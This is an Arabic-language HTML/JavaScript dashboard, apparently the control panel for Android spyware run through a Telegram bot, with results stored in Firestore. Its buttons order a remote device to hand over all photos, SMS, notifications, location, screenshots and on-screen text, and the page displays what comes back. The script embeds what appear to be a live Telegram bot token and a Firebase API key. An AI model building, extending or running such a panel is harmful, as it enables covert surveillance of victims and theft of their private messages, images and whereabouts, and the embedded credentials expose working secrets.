<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CREFTEX Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, "Segoe UI", Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: radial-gradient(ellipse at top, #0f172a, #050810 60%); color: #e8eef8; min-height: 100vh; padding: 16px; padding-bottom: 40px; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 24px; padding: 20px 16px; background: linear-gradient(135deg, rgba(59,130,246,.1), rgba(6,182,212,.05)); border: 1px solid rgba(59,130,246,.2); border-radius: 20px; }
        h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; background: linear-gradient(135deg, #60a5fa, #06b6d4, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subtitle { color: #94a3b8; font-size: 13px; }
        .status { padding: 12px 16px; margin-bottom: 18px; border-radius: 12px; font-size: 14px; font-weight: 600; display: none; text-align: center; }
        .status.show { display: block; }
        .status.ok { background: rgba(16,185,129,.15); color: #34d399; border: 1px solid rgba(16,185,129,.3); }
        .status.err { background: rgba(239,68,68,.15); color: #f87171; border: 1px solid rgba(239,68,68,.3); }
        .status.wait { background: rgba(59,130,246,.15); color: #60a5fa; border: 1px solid rgba(59,130,246,.3); }
        .panel { background: rgba(15,23,42,.8); border: 1px solid rgba(71,85,105,.3); border-radius: 16px; padding: 18px; margin-bottom: 16px; }
        .panel-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
        .panel-title { font-size: 16px; font-weight: 700; color: #93c5fd; }
        .refresh-btn { background: rgba(59,130,246,.15); border: 1px solid rgba(59,130,246,.3); color: #60a5fa; padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; }
        .stats { display: grid; grid-template-columns: repeat(3,1fr); gap: 10px; }
        .stat { background: rgba(30,41,59,.6); padding: 14px 8px; border-radius: 12px; text-align: center; }
        .stat .num { font-size: 22px; font-weight: 800; color: #22d3ee; }
        .stat .lbl { font-size: 11px; color: #94a3b8; margin-top: 4px; }
        .grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
        .btn { padding: 16px 12px; border-radius: 12px; border: none; font-size: 14px; font-weight: 700; color: #fff; cursor: pointer; background: linear-gradient(135deg, #3b82f6, #2563eb); display: flex; align-items: center; justify-content: center; min-height: 52px; text-align: center; }
        .btn:active { transform: scale(.96); }
        .btn.secondary { background: linear-gradient(135deg, #6366f1, #4f46e5); }
        .btn.green { background: linear-gradient(135deg, #10b981, #059669); }
        .btn.orange { background: linear-gradient(135deg, #f59e0b, #d97706); }
        .btn.danger { background: linear-gradient(135deg, #ef4444, #dc2626); }
        .btn.purple { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }
        .log { background: #050810; border-radius: 12px; padding: 14px; max-height: 600px; overflow-y: auto; direction: ltr; border: 1px solid rgba(71,85,105,.2); }
        .msg { padding: 10px 12px; margin-bottom: 8px; border-radius: 10px; background: rgba(30,41,59,.5); border-left: 3px solid #3b82f6; }
        .msg.bot { border-left-color: #06b6d4; background: rgba(6,182,212,.08); }
        .msg.user { border-left-color: #10b981; background: rgba(16,185,129,.08); }
        .msg-time { color: #64748b; font-size: 11px; margin-bottom: 4px; direction: rtl; }
        .msg-from { color: #93c5fd; font-weight: 700; font-size: 12px; direction: rtl; }
        .msg-text { color: #e2e8f0; direction: rtl; text-align: right; margin-top: 6px; white-space: pre-wrap; word-break: break-word; font-size: 13px; }
        .msg-img { max-width: 100%; border-radius: 8px; margin-top: 8px; display: block; border: 1px solid rgba(71,85,105,.3); cursor: pointer; }
        .msg-video { max-width: 100%; border-radius: 8px; margin-top: 8px; display: block; }
        .empty { text-align: center; color: #64748b; padding: 40px 20px; font-size: 14px; direction: rtl; }
        .empty-icon { font-size: 48px; margin-bottom: 12px; opacity: .5; }
        .modal { position: fixed; inset: 0; background: rgba(0,0,0,.95); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
        .modal.show { display: flex; }
        .modal img { max-width: 100%; max-height: 90vh; border-radius: 12px; }
        .modal-close { position: absolute; top: 20px; right: 20px; width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,.1); border: none; color: #fff; font-size: 24px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ CREFTEX</h1>
            <div class="subtitle">لوحة التحكم — Firestore</div>
        </div>

        <div class="status" id="status"></div>

        <div class="panel">
            <div class="panel-header"><div class="panel-title">📊 الإحصائيات</div></div>
            <div class="stats">
                <div class="stat"><div class="num" id="statMsgs">0</div><div class="lbl">رسائل</div></div>
                <div class="stat"><div class="num" id="statImgs">0</div><div class="lbl">صور</div></div>
                <div class="stat"><div class="num" id="statLast" style="font-size:12px">—</div><div class="lbl">آخر تحديث</div></div>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header"><div class="panel-title">🎛 الأوامر</div></div>
            <div class="grid">
                <button class="btn" onclick="sendCmd('/menu')">📋 القائمة</button>
                <button class="btn secondary" onclick="sendCmd('/photos')">📸 كل الصور</button>
                <button class="btn secondary" onclick="sendCmd('/photos 50')">📸 آخر 50</button>
                <button class="btn green" onclick="sendCmd('/info')">📊 معلومات الجهاز</button>
                <button class="btn green" onclick="sendCmd('/location')">📍 الموقع</button>
                <button class="btn orange" onclick="sendCmd('/screen')">📷 لقطة شاشة</button>
                <button class="btn purple" onclick="sendCmd('/sms')">📩 SMS</button>
                <button class="btn purple" onclick="sendCmd('/notifs')">🔔 الإشعارات</button>
                <button class="btn secondary" onclick="sendCmd('/accessibility')">📝 نصوص الشاشة</button>
                <button class="btn danger" onclick="sendCmd('/screen_stop')">🛑 إيقاف اللقطات</button>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <div class="panel-title">💬 المحادثة الكاملة</div>
                <button class="refresh-btn" onclick="loadMessages(true)">🔄 تحديث</button>
            </div>
            <div class="log" id="logBox">
                <div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>
            </div>
        </div>
    </div>

    <div class="modal" id="imgModal" onclick="closeModal()">
        <button class="modal-close" onclick="closeModal()">×</button>
        <img id="modalImg" src="" alt="">
    </div>

    <script>
        // ⚠️ الإعدادات
        const TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM";
        const TELEGRAM_CHAT_ID = "8599240795";
        const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
        const FIREBASE_PROJECT_ID = "hhhxh-5ebe4";

        const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
        const TG_FILE = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`;
        const FS_API = `https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;

        let lastUpdateId = 0;
        let messageCache = {};
        let photoCount = 0;

        // ═══════════════════════════════════════
        //  إرسال أمر
        // ═══════════════════════════════════════
        async function sendCmd(cmd) {
            showStatus(`⏳ إرسال: ${cmd}`, 'wait');
            try {
                const res = await fetch(`${TG_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: cmd })
                });
                const data = await res.json();
                if (data.ok) {
                    showStatus(`✅ تم: ${cmd}`, 'ok');
                    setTimeout(() => loadMessages(true), 2500);
                } else {
                    showStatus(`❌ فشل: ${data.description}`, 'err');
                }
            } catch (e) { showStatus(`❌ خطأ: ${e.message}`, 'err'); }
        }

        // ═══════════════════════════════════════
        //  جلب الرسائل الواردة (getUpdates)
        // ═══════════════════════════════════════
        async function pullIncoming() {
            try {
                const offset = lastUpdateId === 0 ? 0 : lastUpdateId + 1;
                const res = await fetch(`${TG_API}/getUpdates?offset=${offset}&limit=100`);
                const data = await res.json();
                if (!data.ok) return;

                for (const u of (data.result || [])) {
                    lastUpdateId = Math.max(lastUpdateId, u.update_id);
                    const msg = u.message;
                    if (!msg) continue;

                    // منع التكرار
                    const key = `in_${msg.message_id}`;
                    if (messageCache[key]) continue;
                    messageCache[key] = true;

                    // احفظ في Firestore (لو ما كان محفوظ)
                    if (msg.text) {
                        await saveToFirestore({
                            chat_id: msg.chat.id,
                            type: 'text',
                            text: msg.text,
                            time_ms: msg.date * 1000,
                            from_user: true
                        });
                    } else if (msg.photo && msg.photo.length > 0) {
                        const fileId = msg.photo[msg.photo.length - 1].file_id;
                        await saveToFirestore({
                            chat_id: msg.chat.id,
                            type: 'photo',
                            file_id: fileId,
                            caption: msg.caption || '',
                            time_ms: msg.date * 1000,
                            from_user: true
                        });
                    }
                }
            } catch (e) { console.error(e); }
        }

        // ═══════════════════════════════════════
        //  حفظ رسالة في Firestore
        // ═══════════════════════════════════════
        async function saveToFirestore(obj) {
            try {
                const fields = {};
                for (const [k, v] of Object.entries(obj)) {
                    if (typeof v === 'number') fields[k] = { integerValue: String(v) };
                    else if (typeof v === 'boolean') fields[k] = { booleanValue: v };
                    else fields[k] = { stringValue: String(v) };
                }

                await fetch(`${FS_API}?key=${FIREBASE_API_KEY}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ fields })
                });
            } catch (e) { console.error(e); }
        }

        // ═══════════════════════════════════════
        //  جلب كل الرسائل من Firestore
        // ═══════════════════════════════════════
        async function loadMessages(showStatus2) {
            if (showStatus2) showStatus('⏳ جلب الرسائل...', 'wait');

            try {
                const res = await fetch(`${FS_API}?key=${FIREBASE_API_KEY}&pageSize=500`);
                const data = await res.json();

                if (!data.documents) {
                    document.getElementById('logBox').innerHTML = '<div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>';
                    return;
                }

                // رتب حسب الوقت
                const docs = data.documents.map(d => {
                    const f = d.fields || {};
                    return {
                        type: f.type?.stringValue || 'text',
                        text: f.text?.stringValue || '',
                        file_id: f.file_id?.stringValue || '',
                        caption: f.caption?.stringValue || '',
                        time_ms: parseInt(f.time_ms?.integerValue || '0'),
                        from_user: f.from_user?.booleanValue || false
                    };
                }).sort((a, b) => a.time_ms - b.time_ms);

                // حدّث الإحصائيات
                document.getElementById('statMsgs').textContent = docs.length;
                photoCount = docs.filter(d => d.type === 'photo').length;
                document.getElementById('statImgs').textContent = photoCount;
                document.getElementById('statLast').textContent = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });

                // اعرض
                const logBox = document.getElementById('logBox');
                logBox.innerHTML = '';

                for (const doc of docs) {
                    renderMsg(doc, logBox);
                }

                logBox.scrollTop = logBox.scrollHeight;

                if (showStatus2) showStatus(`✅ ${docs.length} رسالة`, 'ok');
            } catch (e) {
                if (showStatus2) showStatus(`❌ خطأ: ${e.message}`, 'err');
            }
        }

        // ═══════════════════════════════════════
        //  عرض رسالة
        // ═══════════════════════════════════════
        function renderMsg(doc, logBox) {
            const time = new Date(doc.time_ms).toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
            const isUser = doc.from_user;

            const el = document.createElement('div');
            el.className = 'msg ' + (isUser ? 'user' : 'bot');

            let content = `<div class="msg-time">${time}</div>`;
            content += `<div class="msg-from">${isUser ? '👤 أنت' : '🤖 البوت'}</div>`;

            if (doc.type === 'photo' && doc.file_id) {
                content += `<div class="msg-text">📸 صورة${doc.caption ? ' — ' + escapeHtml(doc.caption) : ''}</div>`;
                content += `<img class="msg-img" data-file="${doc.file_id}" onclick="openModal(this.src)">`;
            } else if (doc.type === 'video' && doc.file_id) {
                content += `<div class="msg-text">🎥 فيديو</div>`;
                content += `<video class="msg-video" controls data-file="${doc.file_id}"></video>`;
            } else if (doc.type === 'audio' && doc.file_id) {
                content += `<div class="msg-text">🎤 صوت</div>`;
                content += `<audio controls data-file="${doc.file_id}"></audio>`;
            } else if (doc.type === 'document' && doc.file_id) {
                content += `<div class="msg-text">📎 ملف: ${escapeHtml(doc.text)}</div>`;
            } else {
                content += `<div class="msg-text">${escapeHtml(doc.text)}</div>`;
            }

            el.innerHTML = content;
            logBox.appendChild(el);

            // جلب الصورة من Telegram
            const mediaEl = el.querySelector('[data-file]');
            if (mediaEl) loadMedia(doc.file_id, mediaEl);
        }

        async function loadMedia(fileId, el) {
            try {
                const res = await fetch(`${TG_API}/getFile?file_id=${fileId}`);
                const data = await res.json();
                if (data.ok && data.result.file_path) {
                    el.src = `${TG_FILE}/${data.result.file_path}`;
                }
            } catch (e) { console.error(e); }
        }

        // ═══════════════════════════════════════
        //  Helpers
        // ═══════════════════════════════════════
        function showStatus(msg, type) {
            const s = document.getElementById('status');
            s.textContent = msg;
            s.className = 'status show ' + type;
            clearTimeout(window.__st);
            window.__st = setTimeout(() => s.classList.remove('show'), 4000);
        }

        function escapeHtml(s) {
            return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
        }

        function openModal(src) {
            document.getElementById('modalImg').src = src;
            document.getElementById('imgModal').classList.add('show');
        }
        function closeModal() { document.getElementById('imgModal').classList.remove('show'); }

        // ═══════════════════════════════════════
        //  التشغيل
        // ═══════════════════════════════════════
        async function refresh() {
            await pullIncoming();  // اجلب الجديد من تيليجرام
            await loadMessages(false);  // اعرض من Firestore
        }

        refresh();
        setInterval(refresh, 15000);
    </script>
</body>
</html>
